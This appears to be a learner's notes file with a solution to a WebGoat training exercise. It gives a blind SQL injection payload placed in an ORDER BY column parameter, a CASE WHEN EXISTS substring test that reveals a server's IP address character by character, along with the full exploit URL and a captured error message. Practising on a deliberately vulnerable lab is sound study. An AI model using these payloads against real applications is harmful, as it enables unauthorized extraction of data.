-- http link to the site with the completed injection
-- http://localhost:8080/WebGoat/SqlInjection/servers?column=(case when exists(select substring(ip,1,15) from servers where hostname = 'webgoat-prd' AND substring(ip,1,15) = '104.130.219.202' ) then hostname else ip end)



-- sql injection for column
case when exists(select substring(ip,1,1) from servers where hostname = 'webgoat-prd' AND substring(ip,1,1) = '1' ) then hostname else ip end




-- Server Response with the query when query failed

-- user lacks privilege or object not found: TABLENAME in statement 
-- [select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#39;out of order&#39; order by tablename]




















































-- sql injection for column
case when exists(select substring(ip,1,15) from servers where hostname = 'webgoat-prd' AND substring(ip,1,15) = '104.130.219.202' ) then hostname else ip end
